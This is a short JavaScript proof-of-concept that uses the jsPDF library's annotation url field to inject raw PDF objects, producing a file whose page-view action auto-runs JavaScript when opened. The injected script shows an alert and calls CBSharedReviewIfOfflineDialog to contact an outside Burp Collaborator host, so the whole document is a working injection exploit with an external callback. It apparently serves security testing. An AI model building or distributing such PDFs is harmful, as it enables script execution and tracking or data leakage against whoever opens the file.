const {jsPDF} = require("jspdf");
var doc = new jsPDF();
doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>
<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1337);CBSharedReviewIfOfflineDialog('https://opened.qe880a2aqrcv9qcp0drs1c77byho5d.burpcollaborator.net'))>>/(`});
doc.text(20, 20, 'Auto execute when open');
doc.save("output.pdf");
